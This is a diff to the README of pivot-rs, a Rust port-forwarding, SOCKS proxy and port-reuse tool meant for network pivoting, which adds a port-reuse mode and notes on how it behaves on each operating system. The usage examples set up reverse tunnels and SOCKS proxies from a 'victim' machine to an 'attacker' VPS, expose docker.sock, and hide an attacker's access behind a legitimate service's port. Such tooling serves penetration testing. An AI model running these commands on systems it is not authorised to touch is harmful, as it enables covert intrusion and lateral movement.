@@ -1,5 +1,7 @@
 # pivot-rs
 
+[English](README.md) | [简体中文](README.zh.md)
+
 `pivot-rs` is a lightweight port-forwarding and socks proxy tool written in Rust 🦀
 
 ## Build
@@ -17,12 +19,13 @@ cargo build --release
 - TCP/UDP port forwarding
 - Unix domain socket forwarding (e.g. `/var/run/docker.sock`)
 - Socks5 proxy (no/with authentication)
-- Multi network layer support
+- TCP port reuse with `SO_REUSEADDR` and `SO_REUSEPORT`
+- Multi layer proxy support
 - TLS encryption support
 
 ## Usage
 
-`pivot-rs` has two modes: port forwarding mode and socks proxy mode, corresponding to the `fwd` and `proxy` parameters respectively.
+`pivot-rs` has three modes: port forwarding, socks proxy and port reuse mode, corresponding to the `fwd`, `proxy` and `reuse` parameters respectively.
 
 ```bash
 $ ./pivot -h
@@ -34,6 +37,7 @@ Usage: pivot <COMMAND>
 Commands:
   fwd    Port forwarding mode
   proxy  Socks proxy mode
+  reuse  Port reuse mode
   help   Print this message or the help of the given subcommand(s)
 
 Options:
@@ -41,7 +45,7 @@ Options:
   -V, --version  Print version
 ```
 
-Port forwarding mode.
+Port forwarding mode
 
 ```bash
 $ ./pivot fwd -h
@@ -51,14 +55,14 @@ Port forwarding mode
 Usage: pivot fwd [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen address, format: [+][IP:]PORT
-  -r, --remote <REMOTE>  Remote connect address, format: [+]IP:PORT
+  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
+  -r, --remote <REMOTE>  Remote connect IP address, format: [+]IP:PORT
   -s, --socket <SOCKET>  Unix domain socket path
   -u, --udp              Enable UDP forward mode
   -h, --help             Print help
 ```
 
-Socks proxy mode.
+Socks proxy mode
 
 ```bash
 $ ./pivot proxy -h
@@ -68,10 +72,27 @@ Socks proxy mode
 Usage: pivot proxy [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen address, format: [+][IP:]PORT
-  -r, --remote <REMOTE>  Reverse server address, format: [+]IP:PORT
+  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
+  -r, --remote <REMOTE>  Reverse server IP address, format: [+]IP:PORT
   -a, --auth <AUTH>      Authentication info, format: user:pass (other for random)
   -h, --help             Print help
+```
+
+Port reuse mode
+
+```bash
+$ ./pivot reuse -h
+
+Port reuse mode
+
+Usage: pivot reuse --local <LOCAL> --remote <REMOTE> --fallback <FALLBACK> --external <EXTERNAL>
+
+Options:
+  -l, --local <LOCAL>        Local reuse IP address, format: IP:PORT
+  -r, --remote <REMOTE>      Remote redirect IP address, format: IP:PORT
+  -f, --fallback <FALLBACK>  Fallback IP address, format: IP:PORT
+  -e, --external <EXTERNAL>  External IP address, format: IP
+  -h, --help                 Print help
 ```
 
 ### TCP Port Forwarding
@@ -146,7 +167,7 @@ Example:
 ./pivot fwd -r 10.0.0.1:53 -r vps:8888
 ```
 
-The victim's machine will send a handshake packet to `vps:8888`, which is the attacker's machine.
+The victim's machine will send a 4-byte handshake packet (with all 0s) to `vps:8888`, which is the attacker's machine.
 
 The attacker's machine will remember the client address, and forward the traffic to it when user connects to `vps:9999`.
 
@@ -169,7 +190,9 @@ The handshake packet will be sent from machine B to the attacker's machine (port
 
 ### Unix domain socket Forwarding
 
-A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between two processes running on the same machine.
+*This feature is only supported on Linux and macOS*
+
+A Unix domain socket is a IPC (Inter-Process Communication) method that allows data to be exchanged between processes running on the same machine.
 
 `/var/run/docker.sock` and `/var/run/php-fpm.sock` are common Unix domain sockets.
 
@@ -199,13 +222,13 @@ curl http://vps:5555/version
 
 `pivot-rs` supports socks5 protocol (no/with authentication)
 
-Forward socks proxy.
+Forward socks proxy
 
 ```bash
 ./pivot proxy -l 1080
 ```
 
-Reverse socks proxy.
+Reverse socks proxy
 
 ```bash
 # on attacker's machine
@@ -263,6 +286,56 @@ Example of a TLS encrypted reverse socks proxy.
 # now attacker can use socks proxy on vps:8888, and the traffic on port 7777 will be encrypted
 ```
 
+### TCP Port Reuse
+
+`pivot-rs` supports TCP port reuse with `SO_REUSEADDR` and `SO_REUSEPORT` options.
+
+The behavior of port reuse differs from operation systems.
+
+In Windows, there is only `SO_REUSEADDR` option, which allows multiple sockets to bind to the same address and port. But there are some limitations, depending on the accounts `pivot-rs` is running under, and the ip address you are binding to.
+
+e.g. binding to `0.0.0.0` (wildcard address) or `192.168.1.1` (specific address) may have different results in some senarios.
+
+[https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse](https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse)
+
+In Linux, there are both `SO_REUSEADDR` and `SO_REUSEPORT` options. The principle of port reuse is to bind different address.
+
+For example, A machine has two IP addresses `192.168.1.1` and `10.0.0.1`. A program is listening on `10.0.0.1:80`, so you can bind to `192.168.1.1:80` to reuse port.
+
+However, if a program is listening on `0.0.0.0:80`, then you cannot reuse the port because binding to any other address with port 80 is not allowed.
+
+In short, if someone has already bound to `0.0.0.0`, the game is over.
+
+Of course, there is still a way to reuse port with the same address and port, that is, the program itself sets `SO_REUSEPORT`, and the uid of the user executing the program is the same as the uid of the user executing `pivot-rs`.
+
+In macOS, most of the behavior is the same as in Linux, but it is more flexible. Even if a program is bound to `0.0.0.0`, you can still bind to other specific IP addresses, such as `192.168.1.1`, to reuse port. (But not vice versa)
+
+To reuse a port, you need to specify the local address, remote address, fallback address and external address.
+
+`-l` specify the local address you are reusing
+
+`-r` specify the remote address you are redirecting to
+
+`-f` specify the fallback address that other people who are not from the external address will connect to (e.g. normal users)
+
+`-e` specify the external address of attacker's machine, which will connect to the remote address through port reuse mechanism
+
+For example, reuse the port 8000
+
+```bash
+./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -f 127.0.0.1:8000 -e 1.2.3.4
+```
+
+Attackers from external address `1.2.3.4` will connect to `10.0.0.1:22` through `192.168.1.1:8000`, the normal users will fallback to `127.0.0.1:8000` (prevent the service on port 8000 being affected)
+
+It is not recommended to reuse ports on `0.0.0.0` address although it may work in some cases, because it will make the fallback address useless (the fallback connection will be looped in `pivot-rs` and finally cause a crash)
+
 ## Reference
 
 [https://github.com/EddieIvan01/iox](https://github.com/EddieIvan01/iox)
+
+[https://github.com/p1d3er/port_reuse](https://github.com/p1d3er/port_reuse)
+
+[https://ph4ntonn.github.io/port-reuse](https://ph4ntonn.github.io/Port-reuse)
+
+[https://saucer-man.com/operation_and_maintenance/586.html](https://saucer-man.com/operation_and_maintenance/586.html)
